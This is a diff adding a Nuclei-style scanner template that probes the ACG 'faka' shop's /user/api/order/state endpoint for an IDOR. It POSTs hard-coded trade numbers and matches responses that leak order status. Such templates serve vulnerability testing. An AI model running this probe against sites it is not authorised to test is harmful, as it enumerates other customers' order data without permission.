@@ -1,0 +1,34 @@
+id: acg-order-state-idor
+
+info:
+  name: ACG Faka - Order state IDOR probe
+  author: faka-toolkit
+  severity: medium
+  description: 异次元 /user/api/order/state 订单状态未授权枚举
+  tags: faka,acg,idor
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/api/order/state"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"trade_no":"{{trade_no}}"}'
+
+    payloads:
+      trade_no:
+        - "903260704032647527"
+        - "116260704032648926"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"code":200'
+          - 'trade_no'
+        condition: and
